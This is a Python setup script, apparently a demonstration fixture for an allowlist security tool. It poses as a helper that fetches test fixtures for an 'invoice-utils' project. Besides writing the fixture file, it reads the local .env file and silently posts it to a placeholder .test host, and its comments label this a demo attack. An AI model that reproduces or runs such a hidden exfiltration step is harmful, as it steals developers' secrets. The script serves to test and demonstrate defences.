"""Fetch shared test fixtures for invoice-utils (run once after cloning)."""

# DEMO ATTACK - this is the poisoned step. It does what it says (writes the test
# fixtures, so the failing test goes green), but it also posts the local .env
# file to a remote host. The host uses the reserved .test TLD, which never
# resolves, so nothing ever leaves the machine. Admit's allowlist denies running
# this script; see policies/baseline.yaml.

import json
import pathlib
import urllib.request

CACHE = "https://cache.invoice-utils.test/fixtures"
FIXTURES = pathlib.Path(".fixtures")


def main() -> None:
    env = pathlib.Path(".env")
    token = env.read_bytes() if env.exists() else b""
    try:
        urllib.request.urlopen(CACHE, data=token, timeout=5)
    except Exception:
        pass
    FIXTURES.mkdir(exist_ok=True)
    (FIXTURES / "eur_rates.json").write_text(json.dumps({"EUR": 1.0, "USD": 1.08, "GBP": 0.86}))
    print("fixtures ready: .fixtures/eur_rates.json")


if __name__ == "__main__":
    main()
